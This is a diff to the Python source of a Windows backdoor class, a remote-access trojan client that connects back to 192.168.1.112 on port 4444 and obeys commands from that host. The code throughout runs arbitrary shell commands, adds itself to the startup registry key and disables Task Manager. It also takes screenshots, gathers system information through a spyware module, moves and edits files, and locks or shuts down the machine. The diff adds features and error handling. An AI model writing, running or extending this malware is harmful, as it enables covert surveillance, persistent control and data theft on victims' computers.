@@ -1,4 +1,5 @@
 import os
+import re
 import sys
 import time
 import json
@@ -8,7 +9,7 @@ import base64
 import spyware
 import subprocess
 from winreg import *
-import filemanager as fm
+import work_manager as wm
 from PIL import ImageGrab
 from shutil import copyfile
  
@@ -18,7 +19,7 @@ class backdoor:
     APPDATA = os.environ["APPDATA"]
 
     tm_enabled = True
-    file_manager = fm.file_manager()
+    work_manager = wm.manager()
 
     def __init__(self, ip, port):
         while True:
@@ -31,8 +32,11 @@ class backdoor:
                 break
 
     def reliable_send(self, data):
-        json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        try:
+            json_data = json.dumps(data)
+            self.connection.send(json_data.encode())
+        except Exception as e:
+            return "[-] (Client) Couldn't send the data, {}.".format(e)
 
     def reliable_receive(self):
         json_data = b""
@@ -42,13 +46,15 @@ class backdoor:
                 return json.loads(json_data)
             except ValueError:
                 continue
+            except Exception as e:
+                return "[-] (Cilent) Couldn't retrieve the data, {}.".format(e)
 
     def execute_system_command(self, command):
         try:
             DEVNULL = open(os.devnull, 'wb')
             return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
         except Exception as e:
-            return "[-] Unable to execute system command: {}, {}".format(command, e)
+            return "[-] Unable to execute system command: {}, {}.".format(command, e)
 
     def add_to_startup(self, on_startup):
         try:
@@ -61,7 +67,7 @@ class backdoor:
             CloseKey(reg_key)
         except WindowsError as e:
             if not on_startup:
-                return "[-] Unable to add to startup: {}".format(e)
+                return "[-] Unable to add to startup: {}.".format(e)
         else:
             if not on_startup:
                 return "[+] Successfully added to startup."
@@ -85,9 +91,9 @@ class backdoor:
             with open(str_script, "w") as objVBS:
                 objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
             subprocess.Popen(["cscript", str_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            return "[+] Send the victim the following message: {}".format(message)
+            return "[+] Send the victim the following message: {}.".format(message)
         except Exception as e:
-            return "[-] Couldn't send the message: {}, {}".format(message, e)
+            return "[-] Couldn't send the message: {}, {}.".format(message, e)
 
     def vbs_block_process(self, process, popup=False):
         strVBSCode = "On Error Resume Next\n" + \
@@ -127,21 +133,21 @@ class backdoor:
                 self.tm_enabled = False
                 return "[+] Task Manager Disabled."
         except Exception as e:
-            return "[-] Couldn't change the State of the Task Manager: {}".format(e)
+            return "[-] Couldn't change the State of the Task Manager: {}.".format(e)
 
     def get_system_information(self):
         try:
             spw = spyware.spyware()
             return spw.report()
         except Exception as e:
-            return "[-] Could'nt get System Information: {}".format(e)
+            return "[-] Could'nt get System Information: {}.".format(e)
 
     def lock_system(self):
         try:
             ctypes.windll.user32.LockWorkStation()
-            return "[-] Successfully locked the system."
+            return "[+] Successfully locked the system."
         except Exception as e:
-            return "[-] Couldn't lock the system: {}".format(e)
+            return "[-] Couldn't lock the system: {}.".format(e)
 
     def shutdown_system(self, shutdown_type):
         try:
@@ -151,7 +157,7 @@ class backdoor:
             self.connection.close()
             sys.exit(0)
         except Exception as e:
-            return "[-] Couldn't shut down the system: {}".format(e)
+            return "[-] Couldn't shut down the system: {}.".format(e)
 
     def get_screenshot(self):
         try:
@@ -161,79 +167,131 @@ class backdoor:
             screenshot.save(path)
             data = self.read_file(path)
 
-            self.file_manager.delete_file(path)
+            self.work_manager.delete_file(path)
             return data
         except Exception as e:
-            return "[-] Error getting screenshot data: {}".format(e)
+            return "[-] Error getting screenshot data: {}.".format(e)
 
     def change_working_directory_to(self, path):
-        os.chdir(path)
-        return "[+] Changing working directory to: {}".format(os.getcwd())
+        try:
+            os.chdir(path)
+            return "[+] Changing working directory to: {}.".format(os.getcwd())
+        except Exception as e:
+            return "[-] Error changing directory to: {}, {}.".format(path, e)
 
     def read_file(self, path):
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read()).decode()
+        try:
+            with open(path, "rb") as file:
+                return base64.b64encode(file.read()).decode()
+        except Exception as e:
+            return "[-] (Client) Error reading from: {}, {}.".format(path, e)
 
     def write_file(self, path, content):
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
-            return "[+] Upload Successful"
+        try:
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(content))
+                return "[+] Upload Successful"
+        except Exception as e:
+            return "[-] (Client) Error writing to: {}, {}.".format(path, e)
+
+    def edit_file(self, path, content, del_content):
+        try:
+            if os.path.exists(path) and os.path.isfile:
+                if del_content:
+                    open(path, "w").close()
+                    return "[+] Successfully deleted the content of: {}.".format(path)
+                else:
+                    with open(path, "a") as file:
+                        file.write(content)
+
+                    return "[+] Successfully added: {} to: {}.".format(content, path)
+            else:
+                return "[-] The path you specified is not a file."
+        except Exception as e:
+            return "[-] Couldn't edit: {}, {}.".format(path, e)
 
     def run(self):
         while True:
             command = self.reliable_receive()
             command_0 = str(command[0]).lower()
 
-            rest_of_sentence = " ".join(command[1:])
+            rest_of_command = " ".join(command[1:])
+            rest_of_command_as_list = rest_of_command.split(" ")
+
             try:
-                if len(rest_of_sentence) == 0:
-                    if command_0 == "e" or command_0 == "exit":
+                if len(rest_of_command) == 0:
+                    if command_0 == "exit":     #Exit the program
                         self.connection.close()
                         exit()
-                    elif command_0 == "si":
+                    elif command_0 == "info":       #Get Info about the system
                         command_result = self.get_system_information()
-                    elif command_0 == "tm":
+                    elif command_0 == "tsmanager":      #Change task manager state
                         command_result = self.change_tm_state()                        
-                    elif command_0 == "st":
+                    elif command_0 == "startup":        #Add to startup
                         command_result = self.add_to_startup(False)
-                    elif command_0 == "rst":
+                    elif command_0 == "rmstartup":      #Remove from startup
                         command_result = self.remove_from_startup()
-                    elif command_0 == "s":
+                    elif command_0 == "screenshot":     #Get screenshot
                         command_result = self.get_screenshot()
-                    elif command_0 == "q":
-                        command_result = self.file_manager.play_sound("", True)
-                    else:
+                    elif command_0 == "stsound":      #Stop playing a sound
+                        command_result = self.work_manager.play_sound("", True)
+                    elif command_0 == "idle":       #Get how much time idle
+                        command_result = self.work_manager.get_idle_duration()
+                    elif command_0 == "ps":     #List processes
+                        command_result = self.work_manager.get_processes()
+                    else:       #System command
                         command_result = self.execute_system_command(command)
                 else:
-                    if command_0 == "cd":
-                        command_result = self.change_working_directory_to(rest_of_sentence)
-                    elif command_0 == "d":
-                        command_result = self.read_file(rest_of_sentence)
-                    elif command_0 == "u":
-                        command_as_list = rest_of_sentence.split(" ")             
-                        data = command_as_list[-1]
-
-                        command_result = self.write_file(self.APPDATA + "\\", data)
-                    elif command_0 == "r":
-                        command_result = self.file_manager.read_content_of_file(rest_of_sentence)
-                    elif command_0 == "ps":
-                        command_result = self.file_manager.play_sound(rest_of_sentence, False)
-                    elif command_0 == "del":
-                        command_result = self.file_manager.delete_file(rest_of_sentence)
-                    elif command_0 == "exc":
-                        command_0 = self.file_manager.launch_file(rest_of_sentence)
-                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "1":
-                        command_result = self.lock_system()
-                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "2":
-                        command_result = self.shutdown_system("-s")
-                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "3":
-                        command_result = self.shutdown_system("-r")
-                    elif command_0 == "sm":
-                        command_result = self.show_message_box_popup(rest_of_sentence)
+                    if command_0 == "cd":   #Change directory
+                        command_result = self.change_working_directory_to(rest_of_command)
+                    elif command_0 == "download":       #Download a file
+                        command_result = self.read_file(rest_of_command)
+                    elif command_0 == "upload":     #Upload a file
+                        p_index = rest_of_command_as_list.index("-p")
+                        t_index = rest_of_command_as_list.index("-t")
+                    
+                        file_location = " ".join(rest_of_command_as_list[t_index + 1:len(rest_of_command_as_list) - 1])       #What's between -t and the data sent by the server
+                        file_name = " ".join(rest_of_command_as_list[p_index + 1:t_index])
+                        head, tail = os.path.split(file_name)
+                        data = rest_of_command_as_list[-1]
+                        
+                        path = file_location + "\\" + tail
+                        command_result = self.write_file(path, data)
+                    elif command_0 == "read":   #Read file's content
+                        command_result = self.work_manager.read_content_of_file(rest_of_command)
+                    elif command_0 == "psound":     #Stop sound
+                        command_result = self.work_manager.play_sound(rest_of_command, False)
+                    elif command_0 == "del":    #Delete file\folder
+                        command_result = self.work_manager.delete_file(rest_of_command)
+                    elif command_0 == "launch":     #Launch file\folder
+                        command_0 = self.work_manager.launch_file(rest_of_command)
+                    elif command_0 == "cgstate":    #Change state of computer(lock, shutdown)
+                        if rest_of_command == "1":
+                            command_result = self.lock_system()
+                        elif rest_of_command == "2":
+                            command_result = self.shutdown_system("-s")
+                        elif rest_of_command == "3":
+                            command_result = self.shutdown_system("-r")
+                        else:
+                            command_result = "[-] No such parameter for cgstate."
+                    elif command_0 == "sdmsg":      #Send a message
+                        command_result = self.show_message_box_popup(rest_of_command)
+                    elif command_0 == "edit":   #Edit a file
+                        if command[1] == "1":      #Delete content a file
+                            self.edit_file(rest_of_command, "", True)
+                        elif command[1] == "2":    #Add data to the file
+                            path = " ".join(rest_of_command_as_list[1:-1])
+                            content = command[-1]
+                        
+                            self.edit_file(path, content, False)
+                        else:   #System command
+                            command_result = "[-] No such parameter for edit."
+                    else:
+                        command_result = self.execute_system_command(command)
             except Exception as e:
-                command_result = "[-] Error during command execution: {}".format(e)
- 
+                command_result = "[-] (Client) Error during command execution: {}.".format(e)
+
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.1.107", 4444)
+my_backdoor = backdoor("192.168.1.112", 4444)
 my_backdoor.run()
